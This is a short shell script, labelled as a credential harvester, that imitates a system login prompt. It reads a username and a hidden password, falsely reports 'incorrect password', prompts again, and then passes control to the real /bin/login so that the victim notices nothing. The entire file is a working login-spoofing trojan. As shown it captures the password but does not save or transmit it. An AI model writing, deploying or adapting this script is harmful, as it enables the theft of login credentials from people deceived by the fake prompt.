# Harvests login credentials from user
echo -n "user: "
read user

echo -n "password for $user: "
read -s pass

echo "incorrect password"

echo -n "user: "
read user

echo -n "password for $user: "
read -s pass

/bin/login
